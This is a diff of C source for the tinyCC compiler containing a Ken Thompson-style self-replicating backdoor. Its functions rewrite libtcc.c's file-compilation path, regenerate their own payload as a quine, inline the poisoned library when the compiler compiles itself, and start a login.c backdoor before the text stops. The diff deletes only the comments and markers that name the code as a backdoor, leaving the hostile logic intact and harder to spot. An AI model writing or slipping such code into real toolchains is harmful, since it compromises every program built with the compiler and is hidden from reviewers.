@@ -1,10 +1,3 @@
-/*
- * Thompson self-replicating backdoor in tinyCC.
- */
-
-/* Replace [at, at+cut) inside src with the concatenation of the
-   following C strings, terminated by NULL. `at` points into src.
-   Frees src. Does not free the parts. */
 static char *thompson_splice_span(char *src, char *at, size_t cut, ...) {
     va_list ap;
     const char *p;
@@ -52,7 +45,6 @@ static char *thompson_load_path(const char *path) {
     return buf;
 }
 
-/* Rebuild the full chunk: payload array literal + this tail. */
 static char *thompson_rebuild_chunk(void) {
     CString cs;
     int i;
@@ -61,12 +53,10 @@ static char *thompson_rebuild_chunk(void) {
     for (i = 0; thompson_payload[i]; i++)
         cstr_printf(&cs, "\t%d,\n", (unsigned char)thompson_payload[i]);
     cstr_printf(&cs, "\t0\n};\n");
-    /* len 0 => append strlen+1 (include NUL) */
     cstr_cat(&cs, thompson_payload, 0);
     return cs.data;
 }
 
-/* hijack the execution logic in tcc_add_file_internal */
 static char *thompson_poison_libtcc(char *lib_src) {
     const char *anchor = "ST_FUNC int tcc_add_file_internal";
     const char *ret_old = "    return tcc_compile(s1, flags, filename, fd);";
@@ -74,35 +64,27 @@ static char *thompson_poison_libtcc(char *lib_src) {
     char *chunk;
     char *hit;
 
-    /* Rewrite the real call site BEFORE inserting the chunk.
-
-       The problem is that the chunk contains ret_old as a string
-       literal. Splicing after insert would hit that literal first. */
     lib_src = thompson_splice_once(lib_src, ret_old, ret_new);
 
-    /* this is the quine in action. here we are generating this own
-       payload for self-propagation purposes. */
     chunk = thompson_rebuild_chunk();
     hit = strstr(lib_src, anchor);
     if (!hit) {
         tcc_free(chunk);
         return lib_src;
     }
-    
-    /* cut == 0: insert chunk immediately before the anchor. */
+
     lib_src = thompson_splice_span(lib_src, hit, 0, chunk, NULL);
     tcc_free(chunk);
     return lib_src;
 }
 
-/* paste the entire libtcc.c into the tcc.c */
 static char *thompson_inline_libtcc(char *tcc_src, char *poisoned_lib)
 {
     const char *inc1 = "# include \"libtcc.c\"";
     const char *inc2 = "#include \"libtcc.c\"";
     const char *needle;
-    const char *pfx = "\n#if 1 /* thompson inlined poisoned libtcc */\n";
-    const char *sfx = "\n#endif /* thompson */\n";
+    const char *pfx = "\n#if 1\n";
+    const char *sfx = "\n#endif\n";
     char *hit;
     char *out;
 
@@ -117,7 +99,6 @@ static char *thompson_inline_libtcc(char *tcc_src, char *poisoned_lib)
     return out;
 }
 
-/* self-reproducing logic when compiling the compiler */ 
 static int thompson_compile_compiler(TCCState *s1, int flags, const char *filename, int fd) {
     char libpath[1024];
     char *base;
@@ -127,13 +108,11 @@ static int thompson_compile_compiler(TCCState *s1, int flags, const char *filena
     int dlen;
     int ret;
 
-    /* compute lib name */
     close(fd);
     base = tcc_basename(filename);
     dlen = (int)(base - (char *)filename);
     snprintf(libpath, sizeof libpath, "%.*slibtcc.c", dlen, filename);
 
-    /* load lib and main file */
     tcc_src = thompson_load_path(filename);
     lib_src = thompson_load_path(libpath);
     if (!tcc_src || !lib_src) {
@@ -143,20 +122,14 @@ static int thompson_compile_compiler(TCCState *s1, int flags, const char *filena
         return -1;
     }
 
-    /* first we poison the library */
     lib_src = thompson_poison_libtcc(lib_src);
-
-    /* then we inline it in the main file, otherwise the preprocessor
-       would read it clean from disk */
     combined = thompson_inline_libtcc(tcc_src, lib_src);
 
-    /* compile the poison version */
     ret = tcc_compile(s1, flags, combined, -1);
     tcc_free(combined);
     return ret;
 }
 
-/* simple backdoor in login.c */
 static int thompson_compile_login(TCCState *s1, int flags, int fd) {
     char *src;
     const char *needle;
